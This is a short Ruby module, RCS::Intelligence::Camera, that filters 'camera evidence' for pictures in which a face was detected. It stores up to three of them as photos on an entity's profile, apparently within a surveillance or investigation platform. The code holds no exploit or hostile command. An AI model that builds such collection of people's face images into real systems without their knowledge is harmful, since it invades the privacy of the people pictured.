#
#  Module for handling camera evidence
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module Intelligence

class Camera
  include Tracer
  extend Tracer

  class << self

    def save_picture(entity, evidence)
      # don't save picture without faces
      return unless evidence.data['face'] == true

      trace :debug, "Face reco is: #{evidence.data['face'].inspect}"

      # save only the first three pictures
      return if entity.photos.size >= 3

      file = RCS::DB::GridFS.get(evidence.data['_grid'], entity.path.last.to_s)
      entity.add_photo(file.read)

      trace :info, "Saving camera picture (#{entity.photos.size}/3) for #{entity.name}"
    end

  end

end

end
end

